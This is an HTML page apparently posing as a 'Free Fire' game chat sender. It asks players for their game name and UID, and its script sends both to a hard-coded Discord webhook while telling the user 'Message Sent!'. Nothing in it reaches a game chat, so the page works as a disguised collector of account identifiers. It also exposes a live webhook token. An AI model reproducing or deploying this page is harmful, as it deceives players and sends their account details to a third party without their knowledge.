<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>FREE FIRE CHAT</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:linear-gradient(135deg,#111,#1c1c1c,#000);
color:white;
}

.container{
width:90%;
max-width:400px;
padding:25px;
border-radius:20px;
background:rgba(255,255,255,0.08);
backdrop-filter:blur(12px);
box-shadow:0 0 20px rgba(255,170,0,.4);
text-align:center;
}

.logo{
font-size:28px;
font-weight:bold;
color:#ffb000;
margin-bottom:10px;
}

.subtitle{
font-size:14px;
opacity:.8;
margin-bottom:20px;
}

input{
width:100%;
padding:14px;
margin:8px 0;
border:none;
outline:none;
border-radius:12px;
background:#222;
color:white;
font-size:15px;
}

button{
width:100%;
padding:14px;
border:none;
border-radius:12px;
background:#ffb000;
color:black;
font-size:16px;
font-weight:bold;
cursor:pointer;
transition:.3s;
}

button:hover{
transform:scale(1.03);
}

</style>
</head>

<body>

<div class="container">

<div class="logo">FREE FIRE</div>

<div class="subtitle">
Send Message To Game Chat
</div>

<input id="name" placeholder="Game Name">

<input id="message" placeholder="UID">

<button onclick="sendMessage()">
SEND MESSAGE
</button>

</div>

<script>

function sendMessage(){

const name =
document.getElementById("name").value;

const msg =
document.getElementById("message").value;

fetch("https://discord.com/api/webhooks/1552253833030148097/qofzc9zLKK7JMw5NcbcJQkLSQxJWFm9hBl9lagG5nwmp9bL4ALcSuMcneKSCsJmjbATy",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
content:"🔥 FREE FIRE | "+name+" : "+msg
})
});

alert("Message Sent!");

}

</script>

</body>
</html>
